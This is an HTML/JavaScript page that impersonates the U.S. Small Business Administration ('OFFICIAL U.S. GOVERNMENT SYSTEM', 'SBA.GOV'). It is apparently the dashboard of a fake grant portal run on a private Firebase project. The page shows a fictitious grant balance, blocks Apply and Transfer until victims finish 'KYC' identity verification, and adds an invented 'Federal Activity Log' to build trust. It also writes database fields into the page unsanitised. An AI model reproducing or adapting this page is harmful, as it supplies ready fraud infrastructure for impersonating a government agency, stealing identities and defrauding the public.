
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Secure Dashboard</title>
    <style>
        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --bg: #f8fafc; }
        body { background: var(--bg); margin: 0; font-family: 'Segoe UI', Arial, sans-serif; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
        .nav-logo { color: white; margin: 0; font-size: 16px; letter-spacing: 2px; font-weight: 900; }
        
        .signout-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 5px 12px; border-radius: 4px; font-size: 10px; font-weight: 800; cursor: pointer; }

        .balance-section {
            background: linear-gradient(135deg, #00274c 0%, #004a91 100%);
            margin: 15px; padding: 25px; border-radius: 12px; color: white; box-shadow: 0 8px 20px rgba(0,39,76,0.15);
        }

        .status-pill { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 9px; font-weight: 800; text-transform: uppercase; margin-top: 12px; background: rgba(255,255,255,0.2); }
        .status-verified { background: #10b981 !important; }

        .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; max-width: 500px; margin: 0 auto; }
        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; transition: 0.2s; }
        .grid-item:active { transform: scale(0.95); }
        .grid-item span { display: block; font-size: 20px; margin-bottom: 5px; }
        .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; }
        
        /* The "Locked" look */
        .is-locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
        .is-done { border: 2px solid #10b981; background: #f0fdf4; }

        .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; }
        .log-title { font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        .log-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #f8fafc; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SBA PORTAL
    </div>

    <div class="nav-header">
        <h1 class="nav-logo">SBA.GOV</h1>
        <button class="signout-btn" id="signOutBtn">SIGN OUT</button>
    </div>

    <div class="balance-section">
        <p style="margin:0; font-size:9px; text-transform:uppercase; letter-spacing:1px; opacity:0.8;">Current Grant Allocation</p>
        <h1 id="userBalance" style="font-size:32px; margin:8px 0; font-weight: 800;">$0.00</h1>
        <div id="statusPill" class="status-pill">INITIALIZING...</div>
    </div>

    <div class="grid-container">
        <div class="grid-item" id="applyBtn"><span>üìù</span><b>Apply</b></div>
        <div class="grid-item" id="transferBtn"><span>üè¶</span><b>Transfer</b></div>
        <div class="grid-item" onclick="location.href='transactions.html'"><span>üìä</span><b>Ledger</b></div>
        <div class="grid-item" id="kycBtn"><span>üõ°Ô∏è</span><b>Verify</b></div>
        <div class="grid-item" onclick="location.href='support.html'"><span>üí¨</span><b>Support</b></div>
        <div class="grid-item" onclick="location.href='settings.html'"><span>‚öôÔ∏è</span><b>Profile</b></div>
    </div>

    <div class="activity-card">
        <div class="log-title"><span>Federal Activity Log</span><span>SECURE</span></div>
        <div id="activityLog">
            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Syncing with federal servers...</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, query, where } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (!user) { window.location.href = 'index.html'; return; }

            // 1. MASTER LISTENER
            onSnapshot(doc(db, "users", user.uid), (snap) => {
                if (snap.exists()) {
                    const data = snap.data();
                    const balance = parseFloat(data.balance || 0);
                    
                    // Logic to see if KYC is fully approved by Admin
                    const kycDone = data.kycStatus === "APPROVED" || (data.status && data.status.includes("VERIFIED"));

                    document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {minimumFractionDigits: 2});
                    
                    const pill = document.getElementById('statusPill');
                    
                    // Visual Buttons
                    const applyBtn = document.getElementById('applyBtn');
                    const transferBtn = document.getElementById('transferBtn');
                    const kycBtn = document.getElementById('kycBtn');

                    if(kycDone) {
                        pill.innerText = "‚óè ACCOUNT VERIFIED";
                        pill.className = "status-pill status-verified";
                        
                        kycBtn.innerHTML = "<span>‚úÖ</span><b>Verified</b>";
                        kycBtn.classList.add('is-done');
                        kycBtn.onclick = () => alert("Identity Verification is complete.");
                        
                        // Unlock Apply
                        applyBtn.classList.remove('is-locked');
                        applyBtn.onclick = () => location.href = 'apply.html';

                        // Check balance for Transfer
                        if(balance > 0) {
                            transferBtn.classList.remove('is-locked');
                            transferBtn.onclick = () => location.href = 'transfer.html';
                        } else {
                            transferBtn.classList.add('is-locked');
                            transferBtn.onclick = () => alert("DISBURSEMENT PENDING: Apply for grant allocation first.");
                        }
                    } else {
                        pill.innerText = "‚óè ELIGIBILITY: PENDING KYC";
                        pill.className = "status-pill";
                        
                        kycBtn.onclick = () => location.href = 'kyc.html';
                        
                        // Lock everything else
                        applyBtn.classList.add('is-locked');
                        applyBtn.onclick = () => alert("KYC REQUIRED: Complete identity verification to proceed.");
                        
                        transferBtn.classList.add('is-locked');
                        transferBtn.onclick = () => alert("SECURE LOCK: Verification required for all disbursements.");
                    }
                }
            });

            // 2. RECENT LOGS
            const q = query(collection(db, "requests"), where("userId", "==", user.uid));
            onSnapshot(q, (snap) => {
                const logBox = document.getElementById('activityLog');
                if(snap.empty) {
                    logBox.innerHTML = `
                        <div class="log-item">
                            <div><b style="font-size:10px;">Security Handshake</b><br><small style="font-size:8px;">ENCRYPTED CONNECTION STABLE</small></div>
                            <div style="text-align:right;"><b style="font-size:10px; color:#10b981;">SUCCESS</b></div>
                        </div>`;
                    return;
                }
                logBox.innerHTML = "";
                snap.forEach(d => {
                    const r = d.data();
                    logBox.innerHTML += `
                        <div class="log-item">
                            <div><b style="font-size:10px;">${r.type}</b><br><small style="font-size:8px;">REF: ${d.id.substring(0,6).toUpperCase()}</small></div>
                            <div style="text-align:right;">
                                <b style="color:var(--sba-blue); font-size:11px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : '--'}</b><br>
                                <small style="color:#f59e0b; font-size:8px;">${(r.status || 'PENDING').toUpperCase()}</small>
                            </div>
                        </div>`;
                });
            });
        });

        document.getElementById('signOutBtn').onclick = () => signOut(auth);
    </script>
</body>
</html>
